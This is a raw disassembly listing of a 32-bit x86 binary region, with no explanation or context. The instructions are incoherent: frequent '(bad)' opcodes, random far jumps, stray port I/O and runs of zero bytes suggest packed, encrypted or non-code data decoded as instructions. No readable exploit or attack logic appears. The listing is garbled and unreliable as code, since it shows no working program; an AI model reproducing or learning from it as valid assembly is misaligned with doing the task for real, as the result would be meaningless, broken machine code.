  419150:	dec    eax
  419151:	paddb  mm3,QWORD PTR [esi+0x1f]
  419155:	push   ss
  419156:	xor    BYTE PTR [ebp-0x4c855d6a],0x2a
  41915d:	scas   eax,DWORD PTR es:[edi]
  41915e:	out    0x81,eax
  419160:	pop    ds
  419161:	jb     0x419197
  419163:	repnz xchg ebp,eax
  419165:	out    dx,al
  419166:	sub    BYTE PTR [ebx-0x60],0xb2
  41916a:	jmp    0xb760:0xdb169868
  419171:	fnsave [eax+0x1c2c8d72]
  419177:	pop    ebp
  419178:	cld    
  419179:	pop    ss
  41917a:	add    eax,0xafa78675
  41917f:	pusha  
  419180:	add    edi,DWORD PTR [esp+edi*8]
  419183:	in     eax,dx
  419184:	inc    edi
  419185:	push   ds
  419186:	jns    0x419136
  419188:	sub    bh,BYTE PTR [edi+0xc6]
  41918e:	add    BYTE PTR [eax],al
  419190:	outs   dx,BYTE PTR ds:[esi]
  419191:	pop    ds
  419192:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419193:	jg     0x4191ca
  419195:	xchg   esi,eax
  419196:	jmp    0x11ea:0x572a207a
  41919d:	pop    ds
  41919e:	bound  esi,QWORD PTR [eax+0x78f12b02]
  4191a4:	xchg   BYTE PTR [edx],ch
  4191a6:	(bad)  
  4191a7:	bound  edi,QWORD PTR [edi+ebx*1]
  4191aa:	add    BYTE PTR [esi-0x19],dh
  4191ad:	adc    al,0x51
  4191af:	pop    esp
  4191b0:	cmc    
  4191b1:	dec    ebp
  4191b2:	(bad)  
  4191b3:	data16 fwait
  4191b5:	lods   al,BYTE PTR ds:[esi]
  4191b6:	(bad)  
  4191b7:	mov    eax,0xff3ff393
  4191bc:	mov    dh,0x1e
  4191be:	and    BYTE PTR ds:0x2f88bdc2,0xb8
  4191c5:	mov    ecx,0x1eba2bc6
  4191ca:	push   esp
  4191cb:	bound  ecx,QWORD PTR [edx+0x75c1eb9f]
  4191d1:	add    al,BYTE PTR [eax]
  4191d3:	mov    edx,0xc569b5b0
  4191d8:	jle    0x4191e0
  4191da:	and    al,0x16
  4191dc:	pop    ebx
  4191dd:	rcr    eax,1
  4191df:	shl    BYTE PTR [edi],cl
  4191e1:	xchg   esi,eax
  4191e2:	push   es
  4191e3:	jb     0x41922b
  4191e5:	sub    al,BYTE PTR [esi-0x16e2ac21]
  4191eb:	jmp    0x419254
  4191ed:	pop    esi
  4191ee:	mov    eax,ds:0xffc3ad95
  4191f3:	and    DWORD PTR [eax],eax
  4191f5:	add    BYTE PTR [eax],al
  4191f7:	add    BYTE PTR [eax],al
  4191f9:	mov    ah,0xf
  4191fb:	test   bh,bl
  4191fd:	jno    0x419201
  4191ff:	add    BYTE PTR [eax-0x16beb6bf],cl
  419205:	scas   eax,DWORD PTR es:[edi]
  419206:	and    cl,BYTE PTR ds:0x840f76e9
  41920c:	iret   
  41920d:	jno    0x419211
  41920f:	add    BYTE PTR [eax-0x16fff587],al
  419215:	(bad)  
  419217:	addr16 jge 0x41923c
  41921a:	push   ds
  41921b:	std    
  41921c:	xchg   ecx,eax
  41921d:	pop    edx
  41921e:	jecxz  0x41921c
  419220:	xchg   esi,eax
  419221:	sbb    al,0x43
  419223:	je     0x41921d
  419225:	push   ecx
  419226:	shl    DWORD PTR [ebx],1
  419228:	add    al,ah
  41922a:	inc    ebx
  41922b:	std    
  41922c:	mov    bh,BYTE PTR [esi+edi*8+0x66]
  419230:	inc    ecx
  419231:	fld    QWORD PTR [ecx]
  419233:	xchg   eax,esi
  419235:	test   DWORD PTR [eax],0x32edf62f
  41923b:	retf   0xcc43
  41923e:	stc    
  41923f:	xor    eax,0xf601dd7d
  419244:	add    eax,0x3ed504
  419249:	ins    BYTE PTR es:[edi],dx
  41924a:	push   edx
  41924b:	or     BYTE PTR [ebp-0x575c7],cl
  419251:	imul   edi,esi,0x15
  419254:	(bad)  
  419255:	pop    ebx
  419256:	out    0xf2,eax
  419258:	add    eax,0x3ed4b4
  41925d:	add    BYTE PTR [eax],al
  41925f:	add    BYTE PTR [eax],al
  419261:	add    BYTE PTR [eax+eax*1-0xd100000],cl
  419268:	xchg   BYTE PTR ds:0x3ed4c0,bh
  41926e:	fbstp  TBYTE PTR [edx]
  419270:	gs repnz ins BYTE PTR es:[edi],dx
  419273:	inc    esi
  419274:	std    
  419275:	push   edx
  419276:	je     0x41923b
  419278:	sbb    eax,0xef5bff
  41927d:	pop    eax
  41927e:	sub    DWORD PTR [edx-0x3],eax
  419281:	aas    
  419282:	rcr    BYTE PTR [edx+0x67],0xc
  419286:	xor    al,0x60
  419288:	and    bh,bh
  41928a:	cmp    esp,DWORD PTR [esi+0x68c4e9b]
  419290:	aaa    
  419291:	ret    
  419292:	sbb    BYTE PTR [edx],0x86
  419295:	cmp    BYTE PTR [ecx+ecx*2+0x1e848901],dl
  41929c:	mov    al,dh
  41929e:	pop    es
  41929f:	add    ebp,DWORD PTR [edi]
  4192a1:	imul   BYTE PTR [ebp+0x7543ca4d]
  4192a7:	sub    ebx,DWORD PTR [ecx]
  4192a9:	ror    BYTE PTR [ecx+0x716a012a],cl
  4192af:	jae    0x41929b
  4192b1:	and    dl,bh
  4192b3:	fwait
  4192b4:	out    0xc0,eax
  4192b6:	imul   esp,DWORD PTR [esi],0xeab3387a
  4192bc:	(bad)  
  4192bd:	(bad)  
  4192be:	in     eax,dx
  4192bf:	inc    edx
  4192c0:	stc    
  4192c1:	mov    ch,ah
  4192c3:	scas   eax,DWORD PTR es:[edi]
  4192c4:	(bad)  
  4192c5:	xor    BYTE PTR [eax],al
  4192c7:	add    BYTE PTR [eax],al
  4192c9:	add    BYTE PTR [eax],al
  4192cb:	retf   
  4192cc:	mov    ebp,ecx
  4192ce:	retf   0x2b36
  4192d1:	sbb    DWORD PTR [esi-0x9fed5bf],ebp
  4192d7:	jo     0x41933c
  4192d9:	ss inc ecx
  4192db:	jne    0x419288
  4192dd:	lods   al,BYTE PTR ds:[esi]
  4192de:	add    bl,BYTE PTR [ebp-0x5d02a1fd]
  4192e4:	and    al,dh
  4192e6:	pop    es
  4192e7:	and    DWORD PTR [edx+0x78],ecx
  4192ea:	xor    ebp,DWORD PTR [ecx]
  4192ec:	out    0xbf,al
  4192ee:	call   DWORD PTR [edx-0x7d02fbc4]
  4192f4:	leave  
  4192f5:	int3   
  4192f6:	retf   0x2b36
  4192f9:	js     0x4192eb
  4192fb:	scas   al,BYTE PTR es:[edi]
  4192fc:	call   0xb69e9bad
  419301:	add    eax,0x2bdc62fd
  419306:	or     BYTE PTR [esi-0x4ca2dec4],dl
  41930c:	ror    BYTE PTR [edx-0x3e],1
  41930f:	jno    0x41933a
  419311:	mov    eax,0x2fab5188
  419316:	or     al,0x77
  419318:	sub    DWORD PTR [ecx],eax
  41931a:	mov    edi,DWORD PTR [eax-0x5f034edf]
  419320:	and    DWORD PTR [edi+0x43],eax
  419323:	and    al,BYTE PTR [ebx]
  419325:	out    0x22,eax
  419327:	xchg   dl,bh
  419329:	test   bl,0x12
  41932c:	xchg   DWORD PTR [edi+0x98],esp
  419332:	add    BYTE PTR [eax],al
  419334:	xchg   ebx,eax
  419335:	scas   eax,DWORD PTR es:[edi]
  419336:	xor    eax,0x420a8623
  41933b:	or     dl,bh
  41933d:	sbb    esp,edi
  41933f:	stos   DWORD PTR es:[edi],eax
  419340:	jb     0x4192d6
  419342:	es add al,0xfe
  419345:	pop    ebp
  419346:	jae    0x419369
  419348:	loopne 0x419365
  41934a:	dec    edi
  41934b:	add    esp,DWORD PTR [ebx+0x2bbd5e1b]
  419351:	test   DWORD PTR [edi],esp
  419353:	mov    ds:0x9a4eaa88,al
  419358:	add    BYTE PTR [edx],0x72
  41935b:	dec    ebx
  41935c:	and    eax,0x7503e95a
  419361:	cmp    BYTE PTR [edi],0x2f
  419364:	jae    0x419368
  419366:	out    0x88,eax
  419368:	mov    ch,0x96
  41936a:	into   
  41936b:	xchg   BYTE PTR [ebp-0x2196ce5],bl
  419371:	inc    ebx
  419372:	mov    bh,0x22
  419374:	mov    ?,dx
  419377:	ret    
  419378:	xor    BYTE PTR [eax-0x789166fb],0x26
  41937f:	mov    ah,0x71
  419381:	cmc    
  419382:	scas   al,BYTE PTR es:[edi]
  419383:	hlt    
  419384:	stos   BYTE PTR es:[edi],al
  419385:	add    bl,BYTE PTR [edi+0x221bac90]
  41938b:	dec    esp
  41938c:	jg     0x4193d0
  41938e:	fld    QWORD PTR [ebx-0x3]
  419391:	(bad)  
  419392:	aad    0x22
  419394:	(bad)  
  419395:	or     cl,dh
  419397:	clc    
  419398:	add    BYTE PTR [eax],al
  41939a:	add    BYTE PTR [eax],al
  41939c:	add    dh,ch
  41939e:	out    dx,eax
  41939f:	es add al,0x98
  4193a2:	mov    bh,0x70
  4193a4:	enter  0x4931,0x0
  4193a8:	stos   DWORD PTR es:[edi],eax
  4193a9:	jle    0x4193ad
  4193ab:	push   ebx
  4193ac:	bound  edx,QWORD PTR [edx-0x7f]
  4193af:	in     al,0xa1
  4193b1:	enter  0xe801,0x5a
  4193b5:	outs   dx,DWORD PTR ds:[esi]
  4193b6:	sbb    eax,0x96b66dfd
  4193bb:	lsl    edi,WORD PTR [ecx+0x2a]
  4193bf:	and    al,0x87
  4193c1:	push   edi
  4193c2:	sbb    eax,0x1b1025e8
  4193c7:	std    
  4193c8:	cmp    DWORD PTR [ecx+0x29],esi
  4193cb:	add    bh,BYTE PTR [ebx-0x3b1c76ca]
  4193d1:	xor    ebp,DWORD PTR [edi+0x25fb4d88]
  4193d7:	clc    
  4193d8:	inc    ecx
  4193d9:	and    al,0x1d
  4193db:	std    
  4193dc:	dec    esi
  4193dd:	cli    
  4193de:	inc    ecx
  4193df:	je     0x4193f2
  4193e1:	or     ebx,DWORD PTR [ebx]
  4193e3:	(bad)  
  4193e4:	aam    0x3a
  4193e6:	lock aas 
  4193e8:	jmp    0xe99b5b36
  4193ed:	jbe    0x419393
  4193ef:	ss icebp 
  4193f1:	std    
  4193f2:	hlt    
  4193f3:	mov    BYTE PTR [ecx-0x17c4644e],dh
  4193f9:	(bad)  
  4193fa:	mov    edi,0x8dde8ff
  4193ff:	mov    DWORD PTR [ebp+0x0],esi
  419405:	add    BYTE PTR [ecx-0x16],dh
  419408:	add    BYTE PTR [ecx],dh
  41940a:	xchg   edi,eax
  41940b:	dec    ecx
  41940c:	jmp    0x899bd7fc
  419411:	add    al,0x35
  419413:	inc    ebx
  419414:	call   0xfd592897
  419419:	sbb    bh,BYTE PTR [ecx+0x3e90444]
  41941f:	mov    ebp,esp
  419421:	push   0xffffff85
  419423:	stos   BYTE PTR es:[edi],al
  419424:	push   eax
  419425:	add    BYTE PTR [edx+0x30],bl
  419428:	fmul   DWORD PTR [edi]
  41942a:	stos   BYTE PTR es:[edi],al
  41942b:	out    dx,eax
  41942c:	imul   eax,DWORD PTR [edx],0x50954191
  419432:	sar    DWORD PTR [edx],0xb2
  419435:	sbb    al,0x7b
  419437:	ds std 
  419439:	(bad)  
  41943a:	sub    ch,dh
  41943c:	cs stc 
  41943e:	jecxz  0x419423
  419440:	mov    BYTE PTR [ebp-0x7c],al
  419443:	dec    esi
  419444:	in     eax,0x4
  419446:	daa    
  419447:	jecxz  0x419443
  419449:	test   BYTE PTR [edx+esi*2],bl
  41944c:	and    ch,BYTE PTR [edx-0x23]
  41944f:	mov    BYTE PTR [ecx-0x68],al
  419452:	jl     0x419437
  419454:	xor    eax,0xfafd75e8
  419459:	jmp    DWORD PTR [ecx+0x41]
  41945c:	xchg   ebp,eax
  41945d:	push   eax
  41945e:	xor    al,0xe8
  419460:	sub    edi,edi
  419462:	xor    ecx,DWORD PTR [edx-0x1c388a40]
  419468:	mov    esi,0x80
  41946d:	add    BYTE PTR [eax],al
  41946f:	aaa    
  419470:	add    DWORD PTR [edx-0x45],esi
  419473:	add    dl,BYTE PTR [edi-0x3a]
  419476:	ret    
  419477:	sbb    al,0x5
  419479:	out    0xf8,eax
  41947b:	fld    DWORD PTR [esi-0x9877c14]
  419481:	jl     0x41946f
  419483:	mov    eax,0xbf000006
  419488:	pop    ebx
  419489:	push   esp
  41948a:	(bad)  
  41948b:	mov    ecx,0x5c43c8b1
  419490:	mov    BYTE PTR [esp+0x40],dh
  419494:	retf   
  419495:	inc    ebx
  419496:	and    al,0x3f
  419498:	add    eax,0xfebd96e8
  41949d:	inc    DWORD PTR [ebx-0x74d48ee4]
  4194a3:	jne    0x41948c
  4194a5:	out    0x1b,eax
  4194a7:	inc    edx
  4194a8:	scas   eax,DWORD PTR es:[edi]
  4194a9:	out    0x17,eax
  4194ab:	call   0xfc557c86
  4194b0:	fsubrp st(7),st
  4194b2:	adc    ebx,DWORD PTR ds:0x22fd1d22
  4194b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4194b9:	sbb    BYTE PTR [edi-0x7d0ab867],al
  4194bf:	adc    ch,dh
  4194c1:	pop    es
  4194c2:	pop    ds
  4194c3:	mov    cl,0x47
  4194c5:	icebp  
  4194c6:	mov    bh,BYTE PTR [ecx+0x77e7f93f]
  4194cc:	sbb    eax,0x1ede0001
  4194d1:	mov    WORD PTR [eax+eax*1+0x0],?
  4194d5:	add    BYTE PTR [eax],al
  4194d7:	add    BYTE PTR [ecx-0x66837dc9],dl
  4194dd:	cmp    ebp,DWORD PTR [edi]
  4194df:	(bad)  
  4194e0:	fisubr DWORD PTR [edx]
  4194e2:	adc    BYTE PTR [ebx+0x12a9a],al
  4194e8:	and    al,bl
  4194ea:	add    al,0xf0
  4194ec:	jne    0x419519
  4194ee:	test   eax,eax
  4194f0:	push   0xffffffa7
  4194f2:	lea    eax,[edx]
  4194f4:	jne    0x419521
  4194f6:	stos   DWORD PTR es:[edi],eax
  4194f7:	(bad)  
  4194f8:	stc    
  4194f9:	in     ax,0x63
  4194fc:	inc    ebp
  4194fd:	inc    ebx
  4194fe:	ror    DWORD PTR [esi],1
  419500:	add    eax,0x8d752923
  419505:	neg    DWORD PTR [edi]
  419507:	mov    esi,DWORD PTR [ecx]
  419509:	inc    edi
  41950a:	mov    eax,ds:0xa92a0f4f
  41950f:	(bad)
  419513:	std    
  419514:	mov    BYTE PTR [ebp-0x5b8ac00e],bh
  41951a:	adc    BYTE PTR [ebx+0x6085396b],al
  419520:	ja     0x419524
  419522:	out    0x3,eax
  419524:	push   eax
  419525:	out    dx,al
  419526:	out    0xf2,al
  419528:	mov    al,BYTE PTR [edx]
  41952a:	bound  eax,QWORD PTR [ecx]
  41952c:	jno    0x419521
  41952e:	es add al,0x7e
  419531:	dec    edi
  419532:	out    0x3,eax
  419534:	jne    0x4194c3
  419536:	jecxz  0x4194ed
  419538:	sub    DWORD PTR [edx+edi*8],esi
  41953b:	adc    eax,0x0
  419540:	add    dh,dh
  419542:	adc    dh,bl
  419544:	xchg   DWORD PTR [ebp+0x1d03e704],esi
  41954a:	mov    bh,0xf2
  41954c:	add    al,0x75
  41954e:	push   0xffffffc7
  419550:	xchg   edi,eax
  419551:	jns    0x4194d6
  419553:	fdivr  QWORD PTR [ebx-0xc193bd1]
  419559:	(bad)  
  41955a:	jle    0x41951f
  41955c:	dec    edi
  41955d:	jne    0x419561
  41955f:	out    0xb3,eax
  419561:	fimul  DWORD PTR [ebp+0x7e7504d2]
  419567:	daa    
  419568:	cdq    
  419569:	cmp    al,BYTE PTR [ebp+0x4cae89b]
  41956f:	out    0x3,eax
  419571:	int    0xdd
  419573:	push   ecx
  419574:	pop    ds
  419575:	mov    eax,0x596069a0
  41957a:	sub    al,0xe6
  41957c:	add    esi,DWORD PTR [ebp+0x2]
  41957f:	mov    ebx,0x5bed0ce5
  419584:	js     0x4195d7
  419586:	sub    dh,ch
  419588:	add    esi,DWORD PTR [ebp-0x7b]
  41958b:	stos   DWORD PTR es:[edi],eax
  41958c:	out    0x42,eax
  41958e:	sub    dh,BYTE PTR [ecx*1-0x37a3fd8b]
  419595:	push   esi
  419596:	into   
  419597:	xchg   esi,eax
  419598:	push   ds
  419599:	xchg   BYTE PTR [edx-0x27],dh
  41959c:	ret    
  41959d:	push   0xffffff86
  41959f:	add    BYTE PTR [ebp+0x2900d35a],ah
  4195a5:	add    BYTE PTR [eax],al
  4195a7:	add    BYTE PTR [eax],al
  4195a9:	add    BYTE PTR [eax],ah
  4195ab:	sub    al,BYTE PTR [ebx+edx*2]
  4195ae:	jns    0x419581
  4195b0:	mov    edi,0x982a7753
  4195b5:	clc    
  4195b6:	jns    0x4195ba
  4195b8:	call   0xfd57e94c
  4195bd:	mov    edi,0x2acaba7d
  4195c2:	jno    0x4195b6
  4195c4:	jae    0x4195aa
  4195c6:	into   
  4195c7:	push   ss
  4195c8:	std    
  4195c9:	jmp    0xa65541c4
  4195ce:	or     eax,0x7129113f
  4195d3:	lods   al,BYTE PTR ds:[esi]
  4195d4:	(bad)  
  4195d5:	arpl   WORD PTR [edx],di
  4195d7:	jecxz  0x41963c
  4195d9:	cmp    ecx,ecx
  4195db:	aad    0x50
  4195dd:	sub    bl,bh
  4195df:	push   ds
  4195e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4195e1:	jbe    0x41956e
  4195e3:	adc    eax,0xb6cd2d8b
  4195e8:	dec    edi
  4195e9:	add    esi,DWORD PTR [ecx-0x54]
  4195ec:	add    DWORD PTR [esi-0x33],esp
  4195ef:	out    0xe,al
  4195f1:	test   eax,0x6cf88976
  4195f6:	arpl   WORD PTR [esi-0xca449f7],cx
  4195fc:	repz fnstenv [esi+0x673e5616]
  419603:	lods   al,BYTE PTR ds:[esi]
  419604:	inc    BYTE PTR [eax+0x7c]
  419607:	sbb    ebp,edi
  419609:	cs loopne 0x419648
  41960c:	inc    esp
  41960d:	int    0x0
  41960f:	add    BYTE PTR [eax],al
  419611:	add    BYTE PTR [eax],al
  419613:	xchg   DWORD PTR [edi],edx
  419615:	(bad)  
  419616:	cmp    bh,bh
  419618:	xchg   ebp,eax
  419619:	and    edi,ebp
  41961b:	push   ecx
  41961c:	mov    ?,esi
  41961e:	call   0xbe1799
  419623:	inc    eax
  419624:	adc    cl,BYTE PTR ds:0xfe66d10f
  41962a:	dec    DWORD PTR [esp+ebp*2-0x1]
  41962e:	addr16 out 0x2d,eax
  419631:	xchg   BYTE PTR [edi-0xd72dc],al
  419637:	sub    ecx,DWORD PTR [edx+0x7d3c2444]
  41963d:	ror    BYTE PTR [edi],0xd0
  419640:	ds (bad) 
  419642:	call   FWORD PTR [eax*4+0x31c2484]
  419649:	add    BYTE PTR [eax],al
  41964b:	jl     0x41967d
  41964d:	fsubr  st,st(0)
  41964f:	adc    eax,0xa0fffd53
  419654:	mov    esi,0xc3ea0273
  419659:	pushf  
  41965a:	pop    esp
  41965b:	fld    DWORD PTR [ebx-0x3]
  41965e:	imul   eax,DWORD PTR [edx],0xd1ff2ff7
  419664:	or     eax,0x82dc400d
  419669:	clc    
  41966a:	add    ecx,esp
  41966c:	pop    es
  41966d:	call   0x3ff1c9
  419672:	xchg   DWORD PTR [eax],esp
  419674:	push   ds
  419675:	or     al,0xe9
  419677:	add    BYTE PTR [eax],al
  419679:	add    BYTE PTR [eax],al
  41967b:	add    ah,bl
  41967d:	add    BYTE PTR [eax],al
  41967f:	add    BYTE PTR [ebx+edi*8-0x4],cl
  419683:	je     0x41963e
  419685:	div    BYTE PTR [edx]
  419687:	mov    ebx,DWORD PTR [ecx-0x63bc359b]
  41968d:	div    BYTE PTR [edx+0xc]
  419690:	mov    ah,0x8a
  419692:	retf   
  419693:	inc    ecx
  419694:	mov    ecx,gs
  419696:	clc    
  419697:	in     al,dx
  419698:	pop    ebx
  419699:	idiv   edx
  41969b:	jne    0x419621
  41969d:	test   BYTE PTR [esp+0x3ef75],dl
  4196a4:	jne    0x41965c
  4196a6:	(bad)  
  4196a7:	and    al,0x79
  4196a9:	sub    BYTE PTR [ecx],al
  4196ab:	add    BYTE PTR [ebp+0x0],bl
  4196ae:	scas   eax,DWORD PTR es:[edi]
  4196af:	jmp    DWORD PTR [edx+0x0]
  4196b2:	out    dx,al
  4196b3:	out    0xef,eax
  4196b5:	and    eax,0x6af9fd1c
  4196ba:	or     al,0x83
  4196bc:	xor    al,0x2b
  4196be:	add    DWORD PTR [eax],eax
  4196c0:	inc    edx
  4196c1:	hlt    
  4196c2:	xchg   BYTE PTR [ebx],bl
  4196c4:	leave  
  4196c5:	jbe    0x419687
  4196c7:	push   DWORD PTR [ebx]
  4196c9:	aam    0x7
  4196cb:	push   0xffc1b2d9
  4196d0:	sbb    ch,BYTE PTR [eax+0x2d]
  4196d3:	std    
  4196d4:	sbb    dh,BYTE PTR [esi+0x2b0d248c]
  4196da:	add    DWORD PTR [eax],eax
  4196dc:	sbb    eax,0x2d87
  4196e1:	add    BYTE PTR [eax],al
  4196e3:	add    BYTE PTR [eax],al
  4196e5:	jne    0x41968a
  4196e7:	les    esp,FWORD PTR [ebx]
  4196e9:	push   0x47
  4196eb:	add    cl,BYTE PTR ds:0xb6f8
  4196f1:	jne    0x419699
  4196f3:	les    esp,FWORD PTR [ebx]
  4196f5:	cdq    
  4196f6:	sti    
  4196f7:	into   
  4196f8:	fadd   DWORD PTR [esi+0x3]
  4196fb:	pop    esp
  4196fc:	retf   
  4196fd:	sub    esi,DWORD PTR ss:[eax+0xbfef18a]
  419704:	inc    edx
  419706:	sub    dh,BYTE PTR [ecx+0x15039e7]
  41970c:	add    al,bh
  41970e:	jmp    0x380a:0xff31930b
  419715:	inc    ecx
  419716:	pop    es
  419717:	or     esi,DWORD PTR [ecx+ecx*1+0x41]
  41971b:	add    cl,BYTE PTR [ebx-0x5834fdc7]
  419721:	cmp    ch,BYTE PTR [edx-0x17ca4f23]
  419727:	(bad)  
  419728:	xchg   edx,eax
  419729:	adc    BYTE PTR [esi+ecx*1],0x8e
  41972d:	mov    ecx,0xc5b386de
  419732:	test   al,0xe7
  419734:	stos   DWORD PTR es:[edi],eax
  419735:	repnz inc ebp
  419737:	stos   BYTE PTR es:[edi],al
  419738:	add    ebx,DWORD PTR [eax-0x12]
  41973b:	jmp    0x9690:0x720292f2
  419742:	fisubr WORD PTR [edi-0x40]
  419745:	xchg   esi,eax
  419746:	cli    
  419747:	pop    edi
  419748:	nop
  419749:	add    BYTE PTR [eax],al
  41974b:	add    BYTE PTR [eax],al
  41974d:	add    BYTE PTR [esi+0x6c1b40f6],dl
  419753:	aas    
  419754:	cmp    al,0xd
  419756:	ret    
  419757:	adc    edx,esp
  419759:	jecxz  0x4196e0
  41975b:	ret    0x2ee6
  41975e:	imul   ebp,DWORD PTR [edi-0x1da93fa5],0x36
  419765:	scas   al,BYTE PTR es:[edi]
  419766:	je     0x41977b
  419768:	hlt    
  419769:	pop    ss
  41976a:	addr16 ret 0x8ee6
  41976e:	ds push es
  419770:	cli    
  419771:	ret    
  419772:	repnz fisub DWORD PTR [edx]
  419775:	loopne 0x4196f9
  419777:	mov    fs,esp
  419779:	sbb    ch,BYTE PTR [ecx-0x22]
  41977c:	into   
  41977d:	sbb    al,al
  41977f:	adc    esi,ebx
  419781:	fistp  WORD PTR [edx-0x364dc1ed]
  419787:	sub    esi,DWORD PTR [edx-0x68]
  41978a:	xchg   esi,eax
  41978b:	out    dx,al
  41978c:	push   ebp
  41978d:	nop
  41978e:	xchg   esi,eax
  41978f:	repnz xor bl,BYTE PTR ds:[eax+0x13]
  419794:	inc    esi
  419795:	test   BYTE PTR [esi],ch
  419797:	push   es
  419798:	call   0x55052d
  41979d:	cld    
  41979e:	sub    al,BYTE PTR [edi+0x41]
  4197a1:	jmp    0xe99e1504
  4197a6:	jbe    0x419755
  4197a8:	out    0x47,eax
  4197aa:	jg     0x4197c2
  4197ac:	std    
  4197ad:	arpl   WORD PTR [ebp+0xae0cdf],si
  4197b3:	add    BYTE PTR [eax],al
  4197b5:	add    BYTE PTR [eax],al
  4197b7:	sub    al,0xba
  4197b9:	mov    BYTE PTR [esp+ebp*1],cl
  4197bc:	inc    ecx
  4197bd:	or     cl,ch
  4197bf:	and    eax,0x2398ec8a
  4197c4:	lods   eax,DWORD PTR ds:[esi]
  4197c5:	xor    bh,dh
  4197c7:	add    al,0xd1
  4197c9:	fcom   st(1)
  4197cb:	test   BYTE PTR [ecx],dl
  4197cd:	std    
  4197ce:	faddp  st(2),st
  4197d0:	inc    edx
  4197d1:	or     eax,0x27f6d
  4197d6:	jmp    0x694632c2
  4197db:	jbe    0x4197df
  4197dd:	std    
  4197de:	aam    0x2a
  4197e0:	add    al,0x40
  4197e2:	jmp    0x1a3d56d4
  4197e7:	sub    bh,BYTE PTR [edx]
  4197e9:	std    
  4197ea:	cld    
  4197eb:	ds icebp 
  4197ed:	aas    
  4197ee:	jmp    0x3d54adb9
  4197f3:	add    dl,bl
  4197f5:	jmp    DWORD PTR [ecx-0x72]
  4197f8:	fscale 
  4197fa:	std    
  4197fb:	sub    ah,cl
  4197fd:	pop    edx
  4197fe:	jge    0x4197fc
  419800:	les    ecx,FWORD PTR [eax-0x3f80b813]
  419806:	cmc    
  419807:	mov    ecx,0xdc21809c
  41980c:	(bad)  
  41980d:	cmp    dh,ch
  41980f:	daa    
  419810:	retf   0x6a01
  419813:	mov    DWORD PTR [ebx+esi*2+0x81afbfe],ebx
  41981a:	add    BYTE PTR [eax],al
  41981c:	add    BYTE PTR [eax],al
  41981e:	add    BYTE PTR [eax],al
  419820:	call   0x9c2b1846
  419825:	add    BYTE PTR ds:0x8021d949,0xcb
  41982c:	sahf   
  41982d:	jecxz  0x41984e
  41982f:	sbb    DWORD PTR [ebx+edx*1+0x63],0xffffff83
  419834:	xchg   esp,eax
  419835:	(bad)  
  419836:	jae    0x41984f
  419838:	mov    esp,0x6a5410f7
  41983d:	inc    esi
  41983e:	std    
  41983f:	pop    eax
  419840:	mov    edi,0x4c43d139
  419845:	loope  0x41984e
  419847:	adc    DWORD PTR [edi-0x20fc17eb],0xffffffc0
  41984e:	pop    es
  41984f:	inc    esi
  419850:	xchg   edi,eax
  419851:	cmp    ecx,0xfc53de7c
  419857:	adc    eax,0x3d18d0
  41985c:	arpl   sp,si
  41985e:	mov    esi,0xe5276802
  419863:	enter  0xeb63,0xfa
  419867:	call   0x414d3e
  41986c:	retf   0x5511
  41986f:	int    0x5f
  419871:	push   es
  419872:	add    al,0x8a
  419874:	xor    al,0x73
  419876:	sub    DWORD PTR [edx+0xc],ebp
  419879:	scas   al,BYTE PTR es:[edi]
  41987a:	inc    edi
  41987b:	retf   
  41987c:	lahf   
  41987d:	push   es
  41987e:	call   0xfb2d0aa8
  419883:	jmp    0x419885
  419885:	add    BYTE PTR [eax],al
  419887:	add    BYTE PTR [eax],al
  419889:	ret    0xbf7e
  41988c:	shl    esp,0x2
  41988f:	not    al
  419891:	mov    eax,0x9cb60b04
  419896:	(bad)
  419899:	cld    
  41989a:	test   edi,ebx
  41989c:	add    DWORD PTR [ebp+0x28],esi
  41989f:	dec    edi
  4198a0:	rol    DWORD PTR [ebp-0x3d],0x6
  4198a4:	cld    
  4198a5:	stos   BYTE PTR es:[edi],al
  4198a6:	enter  0xd88d,0xf9
  4198aa:	in     al,0x8f
  4198ac:	adc    ah,BYTE PTR [ebx+0x36cab91e]
  4198b2:	sbb    eax,DWORD PTR [ebx]
  4198b4:	je     0x41992f
  4198b6:	jne    0x4198d0
  4198b8:	std    
  4198b9:	push   0x753ff5fb
  4198be:	pop    ecx
  4198bf:	mov    esp,0x412c36c6
  4198c4:	test   BYTE PTR [esi+0x18],cl
  4198c7:	ins    DWORD PTR es:[edi],dx
  4198c8:	rol    ch,0x10
  4198cb:	out    dx,al
  4198cc:	pop    ss
  4198cd:	test   BYTE PTR [ebx+0x1],bl
  4198d0:	int3   
  4198d1:	test   al,0xa4
  4198d3:	daa    
  4198d4:	dec    edi
  4198d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4198d6:	pushf  
  4198d7:	popf   
  4198d8:	div    DWORD PTR [ebp-0x28]
  4198db:	sar    ah,cl
  4198dd:	jl     0x419895
  4198df:	or     esi,DWORD PTR [ebx+eax*8-0x27]
  4198e3:	mov    dh,BYTE PTR [ebx]
  4198e5:	sbb    eax,0xf1ffc12f
  4198ea:	in     eax,0x1b
  4198ec:	push   eax
  4198ed:	add    BYTE PTR [eax],al
  4198ef:	add    BYTE PTR [eax],al
  4198f1:	add    dl,al
  4198f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4198f4:	mov    ebp,0x5c5a5fb
  4198f9:	std    
  4198fa:	adc    BYTE PTR [ebx],0x18
  4198fd:	(bad)  
  4198fe:	clc    
  4198ff:	pop    edx
  419900:	mov    ?,WORD PTR [ecx]
  419902:	out    dx,al
  419903:	fstp   QWORD PTR [ebx]
  419905:	xor    DWORD PTR [ebp-0x4a7f150a],0x1c
  41990c:	lea    esp,[ebx]
  41990e:	int    0x3b
  419910:	idiv   ah
  419912:	fisub  DWORD PTR [ebx+0x16d28318]
  419918:	cld    
  419919:	mov    dh,BYTE PTR [eax]
  41991b:	add    ch,bh
  41991d:	mov    bl,0xc1
  41991f:	xchg   esi,eax
  419920:	pop    esi
  419921:	mov    al,0x4c
  419923:	add    al,0x56
  419925:	mov    ?,WORD PTR [edx+0x11]
  419928:	xor    eax,0xee96b57e
  41992d:	mov    al,0x9a
  41992f:	fcomp  st(3)
  419931:	sbb    BYTE PTR [eax-0x246ca2c],bl
  419937:	dec    eax
  419938:	mov    cs,WORD PTR [edx-0x49]
  41993b:	add    eax,0x1129b4e7
  419940:	xchg   ebx,eax
  419941:	fild   QWORD PTR [esi-0x2c]
  419944:	xor    DWORD PTR [ebx],ebp
  419946:	dec    BYTE PTR [edi]
  419948:	push   cs
  419949:	sbb    ah,bh
